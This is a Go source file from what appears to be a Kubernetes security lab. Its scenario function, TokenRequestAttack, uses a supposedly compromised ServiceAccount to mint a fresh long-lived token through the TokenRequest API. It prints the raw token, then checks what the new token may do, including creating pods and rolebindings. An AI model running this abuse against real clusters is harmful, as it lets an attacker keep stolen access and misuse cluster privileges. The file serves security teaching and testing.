package scenarios

import (
	"context"
	"fmt"

	"k8s-security-lab/internal/cluster"

	authenticationv1 "k8s.io/api/authentication/v1"
	authorizationv1 "k8s.io/api/authorization/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/rest"
)

func TokenRequestAttack() error {
	fmt.Println("[*] Starting TokenRequest abuse scenario")

	namespace := "tenant-a"
	serviceAccountName := "tenant-sa"

	fmt.Printf("[*] Simulating compromised credentials for %s/%s\n", namespace, serviceAccountName)

	compromisedClient, err := cluster.GetServiceAccountClient(namespace, serviceAccountName)
	if err != nil {
		return err
	}

	expirationSeconds := int64(7200)

	fmt.Println("[*] Attempting to mint a fresh ServiceAccount token")

	tokenRequest, err := compromisedClient.CoreV1().
		ServiceAccounts(namespace).
		CreateToken(
			context.Background(),
			serviceAccountName,
			&authenticationv1.TokenRequest{
				Spec: authenticationv1.TokenRequestSpec{
					Audiences:         []string{"https://kubernetes.default.svc"},
					ExpirationSeconds: &expirationSeconds,
				},
			},
			metav1.CreateOptions{},
		)
	if err != nil {
		fmt.Println("[!] Token minting failed")
		fmt.Println("\nEvidence:")
		fmt.Println(err)
		return err
	}

	fmt.Println("[+] Fresh ServiceAccount token minted")

	fmt.Println("\nEvidence:")
	fmt.Println("-----------------------------------")
	fmt.Println(tokenRequest.Status.Token)
	fmt.Println("-----------------------------------")
	fmt.Printf("Expiration: %s\n", tokenRequest.Status.ExpirationTimestamp.Time.Format("2006-01-02 15:04:05 MST"))

	freshClient, err := clientForToken(tokenRequest.Status.Token)
	if err != nil {
		return err
	}

	fmt.Println("\n[*] Verifying effective permissions with the newly minted token")

	checks := []authorizationv1.ResourceAttributes{
		{
			Namespace:   namespace,
			Verb:        "create",
			Group:       "",
			Resource:    "serviceaccounts",
			Subresource: "token",
			Name:        serviceAccountName,
		},
		{
			Namespace: namespace,
			Verb:      "create",
			Group:     "",
			Resource:  "pods",
		},
		{
			Namespace: namespace,
			Verb:      "create",
			Group:     "rbac.authorization.k8s.io",
			Resource:  "rolebindings",
		},
	}

	for _, check := range checks {
		review, reviewErr := freshClient.AuthorizationV1().
			SelfSubjectAccessReviews().
			Create(
				context.Background(),
				&authorizationv1.SelfSubjectAccessReview{
					Spec: authorizationv1.SelfSubjectAccessReviewSpec{
						ResourceAttributes: &check,
					},
				},
				metav1.CreateOptions{},
			)
		if reviewErr != nil {
			return reviewErr
		}

		fmt.Printf(
			" - can %s %s/%s: %t\n",
			check.Verb,
			resourceLabel(check.Group, check.Resource, check.Subresource),
			check.Namespace,
			review.Status.Allowed,
		)
	}

	fmt.Println("\nImpact:")
	fmt.Println("- Attacker can mint fresh tokens without stealing files from a pod")
	fmt.Println("- Short-lived credentials can be continuously refreshed")
	fmt.Println("- Fresh tokens preserve the ServiceAccount RBAC identity")

	return nil
}

func clientForToken(token string) (*kubernetes.Clientset, error) {
	cfg, err := cluster.GetConfig()
	if err != nil {
		return nil, err
	}

	tokenConfig := rest.CopyConfig(cfg)
	tokenConfig.BearerToken = token
	tokenConfig.BearerTokenFile = ""

	return kubernetes.NewForConfig(tokenConfig)
}

func resourceLabel(group, resource, subresource string) string {
	label := resource
	if subresource != "" {
		label = label + "/" + subresource
	}

	if group == "" {
		return label
	}

	return group + ":" + label
}
